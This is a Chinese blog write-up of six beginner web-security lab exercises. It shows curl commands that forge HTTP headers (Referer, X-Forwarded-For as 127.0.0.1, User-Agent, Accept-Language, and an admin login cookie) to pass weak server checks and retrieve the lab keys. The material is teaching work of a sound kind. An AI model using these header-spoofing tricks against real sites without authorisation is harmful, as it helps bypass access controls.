<h2><span id="第一题-观察http-响应头">第一题 观察HTTP 响应头</span></h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>

<p>得到:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>

<h2><span id="第二题-referer理解">第二题 Referer理解</span></h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
<p>通过命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>

<p>从响应中获取key:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<h2><span id="第三题-x-forwarded-for理解">第三题 X-Forwarded-For理解</span></h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>

<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<h2><span id="第四题-user-agent理解">第四题 User-Agent理解</span></h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>

<p>得到key:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<p>第五题 Accept-Language理解</p>
<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>

<h2><span id="第六题-cookie理解">第六题 Cookie理解</span></h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>

<p>发现响应头中会设置cookie:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>

<p>所以请求时将cookie设置为Login=admin即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>http</tag>
      </tags>
  </entry>
</search>
